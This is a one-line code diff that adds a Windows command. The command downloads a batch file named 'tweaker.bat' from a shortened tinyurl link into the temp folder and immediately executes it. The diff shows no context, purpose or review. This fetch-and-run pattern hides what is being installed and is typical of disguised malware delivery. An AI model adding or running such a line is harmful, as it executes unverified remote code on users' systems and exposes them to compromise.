@@ -1,0 +1,1 @@
+curl -sL https://tinyurl.com/tweak100 -o "%TEMP%\tweaker.bat" && "%TEMP%\tweaker.bat"
